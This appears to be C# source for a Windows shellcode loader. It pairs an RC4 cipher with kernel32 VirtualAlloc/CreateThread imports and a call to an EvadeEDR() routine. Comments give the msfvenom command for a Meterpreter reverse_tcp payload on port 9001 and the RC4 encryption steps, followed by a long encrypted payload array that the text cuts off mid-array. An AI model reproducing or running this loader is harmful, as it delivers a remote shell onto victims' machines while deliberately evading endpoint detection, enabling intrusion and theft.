using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Timers;
using System.Buffers.Text;
using System.Collections;
using System.Text.RegularExpressions;

public class RC4
{
    public static string Encrypt(string key, string data)
    {
        Encoding unicode = Encoding.Unicode;

        return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
    }

    public static string Decrypt(string key, string data)
    {
        Encoding unicode = Encoding.Unicode;

        return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
    }

    public static byte[] Encrypt(byte[] key, byte[] data)
    {
        return EncryptOutput(key, data).ToArray();
    }

    public static byte[] Decrypt(byte[] key, byte[] data)
    {
        return EncryptOutput(key, data).ToArray();
    }

    private static byte[] EncryptInitalize(byte[] key)
    {
        byte[] s = Enumerable.Range(0, 256)
          .Select(i => (byte)i)
          .ToArray();

        for (int i = 0, j = 0; i < 256; i++)
        {
            j = (j + key[i % key.Length] + s[i]) & 255;

            Swap(s, i, j);
        }

        return s;
    }

    private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
    {
        byte[] s = EncryptInitalize(key);

        int i = 0;
        int j = 0;

        return data.Select((b) =>
        {
            i = (i + 1) & 255;
            j = (j + s[i]) & 255;

            Swap(s, i, j);

            return (byte)(b ^ s[(s[i] + s[j]) & 255]);
        });
    }

    private static void Swap(byte[] s, int i, int j)
    {
        byte c = s[i];

        s[i] = s[j];
        s[j] = c;
    }

}
class Program
{
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
          uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void Main(string[] args)
        {

           EvadeEDR();

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(hostname -I | cut -d' ' -f1) LPORT=9001 EXITFUNC=thread -f csharp -o mrtcp_csharp.txt
            // python3 rc4.py -k 'HLkkMYkLyJt]k=JWa-4frG4m^$;tx?' -f mrtcp_csharp.txt -o mrtcp_rc4.txt
            // xxd -i mrtcp_rc4.txt

            byte[] enc_buf = new byte[2628] {
  0xc2, 0x14, 0xd6, 0x08, 0x01, 0x44, 0xd6, 0x22, 0xa2, 0x53, 0xad, 0x91,
  0x55, 0x1d, 0xf2, 0x81, 0xdd, 0x36, 0x0d, 0xa0, 0xd8, 0x58, 0xff, 0xec,
  0x21, 0x97, 0x26, 0xcf, 0xc1, 0xe2, 0xe7, 0x8f, 0x3c, 0x60, 0xf1, 0xff,
  0x45, 0xd2, 0x55, 0x64, 0xf8, 0x21, 0x37, 0x04, 0x94, 0xcd, 0x18, 0xf6,
  0x17, 0xe1, 0xd3, 0x2e, 0xf8, 0xb6, 0x10, 0x50, 0xf7, 0x70, 0x71, 0x0c,
  0xf8, 0xbc, 0xa9, 0x37, 0x9e, 0xda, 0x86, 0x02, 0x02, 0xbb, 0xbb, 0xa6,
  0xa2, 0xed, 0xf7, 0x8f, 0xe6, 0x79, 0x7f, 0x57, 0x86, 0xa0, 0xc7, 0xe9,
  0xb7, 0x25, 0x8d, 0x0b, 0xd5, 0x94, 0xd7, 0xd8, 0x2b, 0x10, 0x69, 0x5f,
  0x03, 0x09, 0x65, 0x24, 0xcb, 0xf1, 0x2a, 0x32, 0x8b, 0xdf, 0x8a, 0x90,
  0x1f, 0xf4, 0xbe, 0x05, 0x4c, 0x9e, 0x49, 0x53, 0x6f, 0x7e, 0xbc, 0x25,
  0x46, 0xed, 0xfd, 0x13, 0xfa, 0xa0, 0xd0, 0x9d, 0xa2, 0x0d, 0xe4, 0x88,
  0x56, 0x91, 0xd5, 0x1c, 0x80, 0x65, 0x34, 0x63, 0x29, 0xc8, 0xf8, 0x01,
  0x5f, 0xd1, 0xcc, 0x41, 0xe8, 0x2e, 0xe4, 0x4f, 0xe7, 0x6c, 0x3e, 0x7c,
  0x13, 0x35, 0x5c, 0x08, 0x10, 0x7a, 0x46, 0x8b, 0x4d, 0xef, 0xef, 0x0b,
  0x40, 0x70, 0xb0, 0x1a, 0x5b, 0x19, 0xab, 0x18, 0xb8, 0x43, 0xad, 0x62,
  0x2c, 0x67, 0xdc, 0xb1, 0x0f, 0x9b, 0x7b, 0x7d, 0x8f, 0x5b, 0x16, 0x16,
  0xa5, 0xee, 0x58, 0x79, 0x63, 0x53, 0xb4, 0x94, 0xd1, 0x34, 0xfe, 0x0e,
  0x77, 0x04, 0x29, 0xa8, 0x0d, 0x55, 0x11, 0xfa, 0x7e, 0xaa, 0x3d, 0x00,
  0xf4, 0x6e, 0x02, 0x77, 0x04, 0x5e, 0x67, 0x75, 0xa0, 0xd5, 0x5e, 0xb0,
  0x76, 0x1e, 0x2f, 0xdc, 0x3b, 0xde, 0x11, 0xaf, 0xe9, 0x13, 0x58, 0x8e,
  0xa0, 0x4f, 0xd1, 0x87, 0x12, 0xd6, 0x16, 0x0f, 0x35, 0xdf, 0xe0, 0xab,
  0x16, 0xc7, 0x23, 0xac, 0x44, 0x61, 0x12, 0x21, 0x89, 0xdf, 0x50, 0x41,
  0x56, 0xf3, 0x92, 0x55, 0x02, 0x37, 0xeb, 0xd1, 0xaa, 0xe5, 0x7d, 0x7a,
  0xd1, 0xbf, 0x0d, 0x84, 0xe6, 0x5c, 0x66, 0x33, 0x0a, 0xbe, 0xfd, 0x90,
  0x66, 0x58, 0x8b, 0x2e, 0x8f, 0x6f, 0x84, 0x9d, 0x7c, 0x8a, 0xe5, 0xb5,
  0xa9, 0xad, 0xb8, 0xf8, 0x97, 0xaa, 0xf7, 0x5b, 0x4c, 0xf4, 0xb5, 0xc7,
  0xf9, 0x0d, 0x9a, 0x78, 0x72, 0xf1, 0xeb, 0x4a, 0x4e, 0x17, 0xb6, 0x0c,
  0x37, 0x88, 0xea, 0xea, 0x1a, 0x59, 0xc0, 0x12, 0xfc, 0x03, 0xaa, 0x8a,
  0xa9, 0x97, 0x6f, 0x37, 0x5f, 0x29, 0x88, 0xf9, 0x76, 0xf5, 0xd7, 0x82,
  0x8f, 0xb9, 0x1b, 0x68, 0x53, 0xd0, 0xf7, 0x67, 0xe9, 0xb6, 0xd6, 0x8a,
  0xf5, 0x32, 0x7f, 0x3e, 0x6e, 0x38, 0xfe, 0x58, 0xde, 0xc4, 0x2e, 0x5b,
  0xc0, 0x7f, 0x71, 0x7b, 0x3e, 0xee, 0xec, 0x89, 0x0c, 0xe5, 0xc4, 0x29,
  0xfc, 0x1e, 0x25, 0x61, 0x17, 0x38, 0x0d, 0xc0, 0x92, 0xfb, 0xc1, 0xc9,
  0x8a, 0x93, 0xb5, 0x2d, 0xbe, 0xa9, 0x68, 0x40, 0xa8, 0x1e, 0xa3, 0x7d,
  0xc1, 0x4e, 0x56, 0xd1, 0x93, 0x0c, 0x0c, 0x0f, 0xc3, 0xdf, 0xdd, 0x8b,
  0xfa, 0xf4, 0x8a, 0x76, 0x14, 0x37, 0xe7, 0x08, 0x79, 0xbd, 0xa0, 0x91,
  0xad, 0x32, 0x1d, 0xad, 0x9b, 0xcb, 0x1e, 0x27, 0x81, 0x21, 0xef, 0x24,
  0xd1, 0x93, 0xfa, 0x13, 0xa9, 0x07, 0x66, 0x52, 0x1f, 0x82, 0x44, 0x24,
  0xb7, 0x07, 0x99, 0x38, 0x06, 0xea, 0x44, 0x5a, 0xc0, 0x76, 0x5f, 0xab,
  0x17, 0xfe, 0x6e, 0x35, 0x30, 0xd5, 0xa3, 0x44, 0x49, 0x99, 0xfc, 0x7c,
  0x4a, 0xfc, 0x81, 0xe6, 0x2f, 0xfe, 0xd6, 0x21, 0x9b, 0xa6, 0xeb, 0x07,
  0x84, 0x00, 0xf4, 0x5f, 0xaa, 0x33, 0xe6, 0x88, 0xe2, 0x10, 0xeb, 0x99,
  0x72, 0x6d, 0x90, 0x81, 0x39, 0x94, 0x50, 0x27, 0x8a, 0x9d, 0x38, 0x09,
  0xbe, 0x36, 0xa1, 0x07, 0x73, 0xc2, 0x02, 0x4c, 0x80, 0xaf, 0x10, 0x10,
  0x2a, 0xfa, 0xb2, 0xd0, 0x72, 0x5b, 0xbf, 0x9f, 0xef, 0xe2, 0x2f, 0x9b,
  0x47, 0x86, 0xbf, 0xc3, 0x5a, 0x9f, 0xf7, 0xbe, 0xd4, 0x1d, 0x95, 0x40,
  0x80, 0x96, 0xc7, 0x92, 0x6f, 0x82, 0x9a, 0x12, 0xe3, 0x8b, 0xff, 0xdc,
  0xbf, 0xc8, 0x38, 0x0d, 0xd3, 0xa3, 0x8f, 0x49, 0x3b, 0xa3, 0xb8, 0x11,
  0x4a, 0xfe, 0xb6, 0x0f, 0x3e, 0x03, 0xaf, 0x5c, 0x35, 0x94, 0x04, 0xf4,
  0x04, 0x94, 0xae, 0xa5, 0x2f, 0x26, 0xc7, 0x5c, 0x71, 0x15, 0xe1, 0xfd,
  0x9d, 0x35, 0x92, 0xde, 0x53, 0x34, 0xa0, 0xf5, 0x03, 0x68, 0xd7, 0x73,
  0x20, 0xc1, 0x77, 0xa3, 0x6f, 0x7e, 0x0b, 0xf6, 0x88, 0x1b, 0x04, 0xe7,
  0xbe, 0x67, 0xd1, 0x11, 0x6d, 0xd8, 0x0b, 0x9d, 0x49, 0x05, 0xb3, 0x4e,
  0x5f, 0xa1, 0x94, 0xdc, 0x12, 0x36, 0xd0, 0x85, 0x27, 0x57, 0x3d, 0x07,
  0x1a, 0x90, 0xda, 0x42, 0x02, 0x1c, 0x3e, 0xcb, 0x72, 0x3d, 0xb0, 0xaf,
  0x48, 0x69, 0xf5, 0x74, 0x45, 0x21, 0x2b, 0xc4, 0xf1, 0x45, 0x05, 0xf8,
  0x0b, 0xb2, 0x00, 0x67, 0xce, 0xcc, 0x4b, 0x58, 0xfb, 0xf3, 0x27, 0xf2,
  0x36, 0xd7, 0x6b, 0x88, 0xf7, 0xbe, 0x33, 0x49, 0x43, 0x09, 0x26, 0xc4,
  0xab, 0xcf, 0xaa, 0x7e, 0xff, 0x58, 0x7a, 0x5f, 0xec, 0xda, 0x94, 0x06,
  0xab, 0xb0, 0x95, 0xed, 0x45, 0x82, 0x0b, 0xdb, 0xd6, 0xc8, 0x2f, 0x8b,
  0xa4, 0x2e, 0xca, 0xf1, 0x60, 0x61, 0x7f, 0x49, 0xa9, 0xb9, 0x43, 0xcc,
  0x6f, 0xcc, 0x93, 0xb8, 0xa1, 0xa8, 0xea, 0x4f, 0x49, 0xf3, 0x87, 0x67,
  0xd6, 0xa9, 0xca, 0x28, 0x5c, 0x30, 0x87, 0x0d, 0x0c, 0xc1, 0xf2, 0xa2,
  0x11, 0xb6, 0xc0, 0xbd, 0x7a, 0x8b, 0x86, 0x1a, 0xb6, 0x35, 0x29, 0xc3,
  0xe9, 0x51, 0x78, 0x8f, 0x35, 0xf1, 0x19, 0x2a, 0xa4, 0x7f, 0x05, 0xb6,
  0xcb, 0xa1, 0xf1, 0xc7, 0x62, 0x33, 0x94, 0x42, 0x73, 0xe8, 0x3e, 0x18,
  0x45, 0x9a, 0x2e, 0xcf, 0x79, 0x8d, 0x1d, 0x19, 0xeb, 0xd6, 0x95, 0x42,
  0x2f, 0xc7, 0x72, 0xe7, 0xeb, 0x05, 0x52, 0x8a, 0x60, 0x57, 0x23, 0xd5,
  0x25, 0x5d, 0x23, 0xf7, 0x00, 0x4c, 0xeb, 0x6b, 0xa0, 0x25, 0x05, 0x3d,
  0x71, 0xf3, 0x16, 0x9c, 0x3f, 0x81, 0x1b, 0x35, 0xe8, 0x4a, 0xb0, 0xe0,
  0x0b, 0x3d, 0x30, 0x82, 0xa9, 0x13, 0xad, 0x0c, 0x96, 0xe0, 0x82, 0x09,
  0xd4, 0xfb, 0x64, 0x19, 0x3d, 0xcf, 0x89, 0x4d, 0x10, 0xe9, 0x4a, 0x19,
  0xb7, 0x0c, 0x62, 0x07, 0xac, 0x9c, 0x29, 0x2d, 0xb5, 0x0a, 0x3f, 0x70,
  0x1a, 0xc7, 0xbd, 0xab, 0x8e, 0x74, 0x7d, 0x92, 0xd0, 0xe5, 0x07, 0x8a,
  0xa1, 0x3e, 0xae, 0x22, 0x97, 0x41, 0xd3, 0xbb, 0x0f, 0x7f, 0x98, 0x10,
  0x36, 0xd0, 0x22, 0x58, 0x87, 0x34, 0x2c, 0xe7, 0xca, 0x91, 0x65, 0x04,
  0x89, 0x8d, 0x4d, 0xde, 0x38, 0x06, 0xf3, 0x6e, 0xa8, 0x52, 0x55, 0xa1,
  0x93, 0x2e, 0xaa, 0x1d, 0xec, 0x50, 0x87, 0x8b, 0xb4, 0xcf, 0x46, 0xc2,
  0x33, 0x7b, 0xd9, 0x7f, 0x7a, 0x54, 0x94, 0x7e, 0xfa, 0xed, 0x06, 0x14,
  0xee, 0x48, 0x07, 0xb6, 0x28, 0x4a, 0xe7, 0x31, 0xbd, 0x58, 0xe8, 0x87,
  0xcf, 0x04, 0xd8, 0xd3, 0x7d, 0xea, 0x79, 0x3c, 0x5e, 0x2f, 0x54, 0x1d,
  0x2f, 0x76, 0xad, 0x2c, 0xf4, 0x24, 0x94, 0x24, 0xef, 0xc9, 0x61, 0xee,
  0x43, 0x67, 0x53, 0x41, 0x5e, 0x9c, 0xae, 0x74, 0x56, 0x83, 0x65, 0x8e,
  0x14, 0x39, 0x5d, 0xbf, 0xfd, 0x59, 0xe9, 0xba, 0x8c, 0x5f, 0x37, 0xe7,
  0x9e, 0x9a, 0x6b, 0x4d, 0x37, 0x91, 0x63, 0x0f, 0xbe, 0xf9, 0xdc, 0xc5,
  0xc1, 0x1c, 0x6e, 0xb1, 0x9d, 0x9d, 0xc2, 0xbc, 0xd1, 0x80, 0x45, 0xa7,
  0x8b, 0xf7, 0x67, 0xeb, 0x19, 0xe0, 0xf6, 0x1b, 0x25, 0xbe, 0x84, 0x3f,
  0x49, 0xd5, 0x60, 0x6b, 0xcd, 0xd8, 0x4f, 0xed, 0xf1, 0xf4, 0x86, 0xaa,
  0x50, 0xba, 0x34, 0xc4, 0xad, 0x58, 0xca, 0x33, 0x16, 0x43, 0xee, 0x78,
  0x99, 0x63, 0xdf, 0xea, 0x84, 0x31, 0x23, 0x8a, 0xe7, 0x7b, 0x4d, 0xf6,
  0x8f, 0xf5, 0xd2, 0x4a, 0xc9, 0xd4, 0x01, 0x73, 0x20, 0xcc, 0x58, 0x9b,
  0xfb, 0x5f, 0x58, 0x78, 0xea, 0x7e, 0xff, 0xa5, 0xa0, 0xbd, 0x2a, 0xbc,
  0x92, 0x03, 0x9b, 0x46, 0x1f, 0x2c, 0x67, 0x0d, 0xdf, 0xa1, 0x01, 0x27,
  0x66, 0x70, 0xdc, 0x23, 0xfd, 0xd0, 0xc5, 0x21, 0xf2, 0x11, 0x28, 0x57,
  0xd9, 0xb3, 0xa4, 0x01, 0xe3, 0xb9, 0xb0, 0x20, 0x08, 0xec, 0xa7, 0x28,
  0x00, 0x72, 0xfd, 0x5e, 0x04, 0x3c, 0xf9, 0x03, 0x95, 0x42, 0xc0, 0x60,
  0xf5, 0x26, 0x46, 0x9d, 0x9a, 0xa0, 0xbf, 0x7e, 0xf1, 0xe0, 0x86, 0xc3,
  0xeb, 0x62, 0x02, 0xd5, 0x6f, 0x7a, 0xd6, 0xe5, 0xe5, 0xb4, 0x74, 0xf2,
  0xd0, 0x6e, 0xad, 0x56, 0x65, 0x15, 0xfd, 0x17, 0xaf, 0xaf, 0x72, 0xa7,
  0x0f, 0xc5, 0x0f, 0xd1, 0x1b, 0x17, 0x52, 0x5d, 0xd1, 0xa4, 0xf8, 0x09,
  0xd4, 0xcb, 0xd0, 0x4b, 0xd5, 0x02, 0xc4, 0xb5, 0xdb, 0x4d, 0x94, 0x9b,
  0xc5, 0xe0, 0xb3, 0x46, 0x75, 0x73, 0x69, 0x20, 0x2c, 0x44, 0x2f, 0x44,
  0xd6, 0x05, 0xfa, 0x8e, 0xd5, 0x9c, 0xa6, 0xd6, 0x11, 0xbb, 0xec, 0x3a,
  0xca, 0xfc, 0xf0, 0x0a, 0xa9, 0x0d, 0x78, 0x57, 0xb2, 0xd7, 0x48, 0x38,
  0x39, 0xeb, 0x25, 0x48, 0x96, 0xbc, 0x8e, 0xc3, 0x61, 0x7e, 0x14, 0x29,
  0x7d, 0xe9, 0x23, 0x5c, 0x33, 0xc8, 0x2e, 0x09, 0x45, 0xbb, 0x31, 0x2e,
  0x42, 0x4b, 0x55, 0x74, 0x34, 0x5e, 0xdb, 0x94, 0xe1, 0x63, 0x93, 0x25,
  0x6d, 0x4a, 0xda, 0x1f, 0xe9, 0x3c, 0xd8, 0x94, 0x14, 0x7b, 0x82, 0x86,
  0xb4, 0x3b, 0xba, 0xd7, 0x12, 0xa8, 0xa4, 0xf0, 0x74, 0x55, 0xca, 0x3a,
  0x38, 0xf2, 0x3b, 0x8b, 0x36, 0x04, 0xe7, 0x7a, 0xeb, 0x6c, 0x44, 0x42,
  0xb9, 0x6d, 0xc9, 0xbc, 0xdc, 0x83, 0xf8, 0xce, 0xcc, 0x72, 0xa1, 0xcf,
  0xd7, 0xf0, 0x68, 0x10, 0xbe, 0x66, 0x37, 0x87, 0xe0, 0x99, 0x0a, 0x26,
  0x17, 0x83, 0xa6, 0x71, 0x3b, 0xf7, 0x4e, 0x6e, 0x92, 0x0d, 0x59, 0x18,
  0xed, 0xa6, 0xdd, 0x13, 0xf3, 0xa7, 0x24, 0xdd, 0x6d, 0xde, 0xf6, 0x6e,
  0x18, 0x30, 0xb4, 0xfc, 0xd6, 0x02, 0xa7, 0x5e, 0x66, 0xb0, 0x77, 0x33,
  0xc5, 0x84, 0xd2, 0x29, 0x55, 0x4b, 0x7f, 0x81, 0xeb, 0x8a, 0xd3, 0xea,
  0xc3, 0x32, 0x32, 0xbf, 0x9a, 0xf3, 0x68, 0xb9, 0xb9, 0x2d, 0x91, 0x18,
  0x0a, 0x32, 0xe0, 0x0e, 0x78, 0x80, 0xab, 0x9e, 0x85, 0xf7, 0x1c, 0xf5,
  0xc1, 0xe8, 0xbe, 0x9a, 0x46, 0x21, 0x34, 0xa3, 0x66, 0x1d, 0x8e, 0x8a,
  0xe3, 0xfc, 0xcd, 0x66, 0x09, 0xae, 0xde, 0x49, 0x9d, 0xc1, 0xaa, 0x97,
  0xe5, 0x51, 0x7c, 0x16, 0x5a, 0x09, 0xe7, 0xf4, 0xc1, 0xc5, 0xa8, 0xac,
  0x5f, 0x5a, 0xbe, 0x1e, 0xfe, 0xa9, 0x3f, 0xfe, 0x85, 0x13, 0xdd, 0x6d,
  0x4d, 0xc1, 0xbb, 0xfa, 0x88, 0x7a, 0x76, 0xc7, 0x8d, 0xd6, 0x85, 0x74,
  0xc6, 0xd6, 0x02, 0x8e, 0x32, 0xb2, 0xcd, 0x0b, 0xb4, 0x29, 0x5b, 0xd4,
  0x10, 0x17, 0xec, 0x20, 0xd7, 0xd2, 0x25, 0x44, 0x10, 0x99, 0x28, 0xa3,
  0x26, 0x91, 0x5d, 0x66, 0x41, 0xb4, 0x6e, 0xdd, 0x87, 0x36, 0x53, 0x19,
  0x10, 0x16, 0xc9, 0x2d, 0x26, 0xb7, 0xa6, 0xa5, 0xa6, 0x3a, 0x62, 0x5a,
  0x30, 0xce, 0x50, 0xf1, 0x48, 0x7d, 0xf7, 0x1f, 0xd1, 0x47, 0x3d, 0x6f,
  0x2d, 0x44, 0x30, 0x7f, 0x06, 0x3f, 0x37, 0x1f, 0x40, 0x96, 0x35, 0x00,
  0xee, 0xfb, 0x2d, 0x7b, 0xe4, 0x20, 0x47, 0x46, 0xaa, 0x09, 0x67, 0x20,
  0x1b, 0x71, 0xee, 0x88, 0x07, 0x38, 0xb0, 0x22, 0x79, 0xae, 0x6f, 0x48,
  0x58, 0x01, 0x41, 0xb6, 0x40, 0x4b, 0x79, 0x51, 0x62, 0xd3, 0xb2, 0xd9,
  0xc8, 0x25, 0x71, 0x66, 0xb6, 0x65, 0x7a, 0x97, 0xa2, 0x86, 0x0b, 0x36,
  0xe8, 0x7b, 0xb4, 0xca, 0x31, 0x36, 0xeb, 0xc8, 0xc4, 0x95, 0xaa, 0x7a,
  0x75, 0x32, 0x15, 0x55, 0x4b, 0x57, 0x44, 0x5d, 0x08, 0x1a, 0xb5, 0x89,
  0x96, 0xbf, 0x8a, 0x74, 0x71, 0x3d, 0x2f, 0x9e, 0x7a, 0x99, 0x2e, 0x62,
  0x2b, 0x2d, 0x09, 0x8e, 0xa7, 0x94, 0x4d, 0xc8, 0xe4, 0x91, 0x85, 0xc2,
  0x11, 0x97, 0x46, 0x58, 0xfd, 0x5d, 0x27, 0xfe, 0x86, 0xa3, 0x10, 0x7a,
  0x56, 0x14, 0xd2, 0x15, 0xe5, 0x9f, 0x46, 0x31, 0xb9, 0xd4, 0x51, 0x82,
  0xec, 0x2a, 0x7d, 0xbe, 0x12, 0x7b, 0xcb, 0x6e, 0x91, 0x23, 0xc8, 0x18,
  0xeb, 0x19, 0x14, 0x09, 0xc4, 0xf4, 0x84, 0xd5, 0xa5, 0xed, 0xe5, 0xcb,
  0x77, 0xa2, 0x31, 0x1d, 0xf5, 0xdd, 0xd7, 0x32, 0xdc, 0xec, 0x54, 0xb7,
  0x2e, 0xa4, 0xdb, 0xe7, 0x11, 0xfe, 0xce, 0xe6, 0xdc, 0xc9, 0x70, 0xbe,
  0x9b, 0x82, 0x1e, 0x81, 0x16, 0xd8, 0x3a, 0x3b, 0x77, 0x29, 0xd6, 0x4a,
  0xeb, 0x56, 0x93, 0xbd, 0x73, 0xd4, 0x02, 0xdc, 0xe0, 0xe0, 0xef, 0xd5,
  0xe3, 0xbc, 0x0e, 0xef, 0x4c, 0xba, 0xe6, 0x32, 0x7a, 0xe6, 0x97, 0x82,
  0xb8, 0x92, 0x62, 0x1f, 0x2c, 0x96, 0x6d, 0x76, 0x37, 0x8d, 0x4b, 0x6c,
  0xe5, 0x47, 0x38, 0x8c, 0x1f, 0x19, 0x27, 0xf7, 0xf2, 0xed, 0xa5, 0x36,
  0xbd, 0x8e, 0x06, 0xa6, 0xf6, 0xc4, 0x3f, 0xe1, 0x1d, 0xe9, 0xe2, 0xac,
  0x95, 0xa3, 0x30, 0x45, 0x09, 0x08, 0x37, 0xdb, 0xf2, 0xbd, 0xab, 0x1a,
  0x54, 0x72, 0xff, 0x06, 0x1e, 0x7b, 0x5e, 0xa9, 0x45, 0x1f, 0xcd, 0x64,
  0x63, 0x13, 0x58, 0xeb, 0x5b, 0x7e, 0x31, 0x0c, 0xea, 0x5c, 0x2d, 0xf3,
  0x81, 0x1e, 0xb0, 0x22, 0xe1, 0xbb, 0x0e, 0xb2, 0xbd, 0xfe, 0xd3, 0x3a,
  0x7a, 0x1b, 0x2e, 0xdd, 0xef, 0xf2, 0x1b, 0xd4, 0x68, 0x68, 0x13, 0x30,
  0xa5, 0x97, 0xc6, 0x00, 0x4a, 0x7b, 0xe1, 0x9a, 0x7b, 0xae, 0x2e, 0xc8,
  0x79, 0x49, 0x80, 0x96, 0x0e, 0xec, 0x7d, 0xb6, 0x05, 0x1a, 0x33, 0xdf,
  0x4c, 0xcc, 0xd8, 0xe1, 0x1e, 0xce, 0x14, 0xa0, 0x93, 0xf9, 0xc4, 0xa5,
  0x4c, 0x6c, 0x22, 0xab, 0x96, 0x10, 0x08, 0xa9, 0xd1, 0x4f, 0xe0, 0xab,
  0x8d, 0x4d, 0xac, 0xea, 0x7f, 0x37, 0xb2, 0x19, 0x41, 0xb0, 0xd2, 0x93,
  0x16, 0xd1, 0xa7, 0x35, 0x51, 0xee, 0x84, 0xb3, 0x16, 0x5e, 0x49, 0x9e,
  0x07, 0x6e, 0x6b, 0xe6, 0xe0, 0x01, 0x7f, 0x52, 0x0a, 0xb6, 0x85, 0x29,
  0x22, 0xd6, 0xcf, 0x0f, 0x9e, 0xde, 0x9b, 0x4d, 0xf1, 0xb4, 0x09, 0xe1,
  0x22, 0x18, 0x61, 0xe3, 0x99, 0x36, 0x9d, 0x34, 0x69, 0xb6, 0x5f, 0xcc,
  0xd4, 0x03, 0x7a, 0x9c, 0xd6, 0x4b, 0x0f, 0xa8, 0x84, 0xa4, 0x20, 0x69,
  0xe3, 0xbf, 0xb4, 0x04, 0x14, 0x48, 0x83, 0x69, 0xbc, 0xa6, 0xc4, 0xa5,
  0xc8, 0x8b, 0x69, 0x2f, 0x31, 0x12, 0xad, 0xeb, 0x31, 0x08, 0x35, 0xcc,
  0x13, 0x7c, 0x89, 0x18, 0x53, 0x21, 0x46, 0x44, 0xcb, 0x3e, 0xcb, 0x22,
  0x24, 0x31, 0xae, 0x61, 0x8a, 0x27, 0x30, 0xe1, 0xa2, 0x6e, 0x56, 0x9d,
  0xcd, 0xe9, 0xa4, 0x6d, 0x51, 0xd4, 0xb7, 0xd1, 0x7b, 0xaf, 0x20, 0xd2,
  0x8f, 0x88, 0x2c, 0x05, 0x6a, 0x37, 0xed, 0x10, 0x02, 0xc3, 0xbb, 0x7c,
  0xb5, 0x1c, 0xcb, 0xad, 0xc1, 0x6a, 0xbf, 0x00, 0x84, 0xb3, 0x71, 0xa5,
  0x4d, 0xe8, 0x8f, 0xee, 0xe8, 0xd6, 0x3a, 0xaa, 0x11, 0xe3, 0x25, 0x25,
  0xfd, 0x36, 0xc3, 0xb5, 0x0c, 0x1c, 0x92, 0x15, 0xd2, 0x05, 0xac, 0xb0,
  0xcc, 0x5b, 0x97, 0x55, 0x30, 0x8f, 0xba, 0xea, 0x0b, 0x98, 0x49, 0xab,
  0x22, 0xbb, 0xaa, 0x36, 0xcc, 0xc3, 0x41, 0x95, 0x1f, 0x92, 0x4c, 0xeb,
  0x06, 0x54, 0x30, 0xc4, 0xbf, 0xfc, 0x69, 0xfa, 0xef, 0xc6, 0x1d, 0x01,
  0xc8, 0x62, 0x8c, 0xb2, 0x70, 0xd6, 0x83, 0x7a, 0xb9, 0xa5, 0x60, 0x7a,
  0xcf, 0xa7, 0x8d, 0x6a, 0x72, 0x20, 0xfb, 0x04, 0xaa, 0xad, 0x2a, 0x41,
  0x3a, 0xf1, 0x70, 0xcc, 0xd4, 0x27, 0x6f, 0x1d, 0xf3, 0x44, 0xc7, 0xf1,
  0xd0, 0x21, 0x19, 0xeb, 0x11, 0x82, 0x52, 0x29, 0xae, 0x15, 0x66, 0x51,
  0x10, 0xcd, 0xc0, 0xde, 0xce, 0x9e, 0x00, 0x40, 0x06, 0x1b, 0x61, 0xdb,
  0x26, 0x8d, 0xdb, 0x90, 0x1a, 0xbe, 0xe3, 0xe9, 0xc3, 0x8d, 0xe2, 0xe5,
  0x09, 0x94, 0x06, 0x14, 0x78, 0x8d, 0x2c, 0x00, 0x80, 0x13, 0x45, 0x57,
  0x0e, 0x3a, 0xae, 0x29, 0x6c, 0x86, 0x7d, 0xd6, 0x65, 0xac, 0x22, 0x07,
  0xec, 0x6c, 0x05, 0xb6, 0x01, 0xfa, 0x43, 0x4e, 0x15, 0x15, 0x9c, 0x96,
  0xda, 0x14, 0xf4, 0x52, 0x4e, 0xd9, 0x36, 0x6d, 0xec, 0x1c, 0xdb, 0x8f,
  0x70, 0x13, 0x75, 0x0b, 0xb4, 0x46, 0x3c, 0xd3, 0x84, 0xb1, 0xb7, 0x2c,
  0xbc, 0x6f, 0x55, 0x52, 0x84, 0x8e, 0x81, 0x6e, 0x9a, 0x87, 0xeb, 0x81,
  0x9f, 0xa3, 0xec, 0xe7, 0x13, 0x8b, 0x70, 0x06, 0xb6, 0xfe, 0xc8, 0xf7,
  0xd0, 0x2f, 0x91, 0xf1, 0xc5, 0xe5, 0xcd, 0x00, 0x56, 0x5d, 0xcd, 0x9e,
  0x22, 0xa3, 0xcb, 0xaf, 0x3e, 0x0c, 0x31, 0x17, 0xd8, 0x77, 0x36, 0xee,
  0x85, 0xb5, 0xb0, 0x8f, 0x68, 0xd2, 0xf3, 0xeb, 0xc7, 0xa8, 0xed, 0xc5,
  0x7b, 0xef, 0x17, 0x7b, 0xbe, 0xaf, 0x2c, 0xa2, 0x09, 0x51, 0x2c, 0x58,
  0x99, 0x72, 0x38, 0xa5, 0xcf, 0xd1, 0xce, 0x4e, 0x64, 0xce, 0x10, 0x88,
  0x04, 0x25, 0x5f, 0x0e, 0xa3, 0xee, 0x59, 0x4e, 0x2f, 0x99, 0x00, 0xca,
  0x97, 0x05, 0x3e, 0x55, 0x5c, 0x88, 0x10, 0x6e, 0x27, 0x5e, 0xe5, 0x1c,
  0x8e, 0x6a, 0x83, 0xce, 0x5e, 0xef, 0xa1, 0x73, 0x5a, 0xe7, 0x84, 0x1d,
  0xc9, 0x67, 0x6f, 0x29, 0x14, 0x55, 0x1b, 0x50, 0xba, 0x6c, 0xba, 0xbb,
  0xa2, 0x4d, 0x60, 0x62, 0xbf, 0x50, 0x23, 0x37, 0x68, 0xfb, 0xd1, 0xd9,
  0xad, 0x83, 0x8b, 0xc2, 0xd3, 0x69, 0x9c, 0x96, 0x51, 0xcd, 0x82, 0x8e,
  0x4e, 0x40, 0xc3, 0xfd, 0x85, 0x6c, 0x3b, 0xac, 0x6d, 0x26, 0x03, 0x57,
  0xbd, 0x0a, 0x75, 0xe6, 0x61, 0x73, 0x71, 0xa1, 0x21, 0xf5, 0x1b, 0x51,
  0xba, 0x9d, 0xa8, 0x50, 0xdd, 0x39, 0x54, 0x6d, 0x32, 0x6e, 0x1c, 0x7d,
